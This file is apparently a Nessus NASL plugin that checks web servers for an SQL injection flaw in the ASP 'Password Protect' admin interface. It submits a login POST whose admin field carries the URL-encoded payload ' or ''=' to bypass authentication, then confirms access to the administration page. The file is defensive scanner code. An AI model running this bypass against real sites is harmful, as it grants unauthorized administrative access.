#
# This script was written by Noam Rathaus
#
# GPL
#
# Contact: Criolabs <security@criolabs.net>
# Subject: Password Protect XSS and SQL-Injection vulnerabilities.
# Date: 	31.8.2004 02:17

if(description)
{
 script_id(14587);
 script_cve_id("CAN-2004-1647", "CAN-2004-1648");
 script_bugtraq_id(11073);
 script_version("$Revision: 1.4 $");
 script_name(english:"Password Protect SQL Injection");
 
 
 desc["english"] = "
Password Protect is a password protected script allowing you to manage a 
remote site through an ASP based interface.
 
An SQL Injection vulnerability in the product allows remote attackers to
inject arbitrary SQL statements into the remote database and to gain
administrative access on this service.

Solution : Upgrade to the latest version of this software
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for the Password Protect Injection";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
 family["english"] = "CGI abuses : XSS";
 script_family(english:family["english"]);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

debug = 0;
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(
 "GET /", dir, "/adminSection/main.asp HTTP/1.1\r\n",
 "Host: ", get_host_name(), ":", port, "\r\n",
 "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040823 Firefox/0.9.3\r\n",
 "Accept: */*\r\n",
 "Connection: close\r\n",
 "\r\n"
 );

 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 v = eregmatch(pattern: "Set-Cookie: *([^; \t\r\n]+)", string: res);

 if (isnull(v)) exit(0); # Cookie is not available

 cookie = v[1];

 req = string(
 "POST /", dir, "/adminSection/index_next.asp HTTP/1.1\r\n",
 "Host: ", get_host_name(), ":", port, "\r\n",
 "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040823 Firefox/0.9.3\r\n",
 "Accept: */*\r\n",
 "Connection: close\r\n",
 "Cookie: ", cookie, "\r\n",
 "Content-Type: application/x-www-form-urlencoded\r\n",
 "Content-Length: 57\r\n",
 "\r\n",
 "admin=%27+or+%27%27%3D%27&Pass=password&BTNSUBMIT=+Login+\r\n"
 );

 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 req = string(
 "GET /", dir, "/adminSection/main.asp HTTP/1.1\r\n",
 "Host: ", get_host_name(), ":", port, "\r\n",
 "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040823 Firefox/0.9.3\r\n",
 "Accept: */*\r\n",
 "Connection: close\r\n", 
 "Cookie: ", cookie, "\r\n",
 "\r\n");
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);

 if ( "Web Site Administration" >< res  && "The Web Animations Administration Section" >< res )
 {
	security_hole(port);
	exit(0);
 }
}


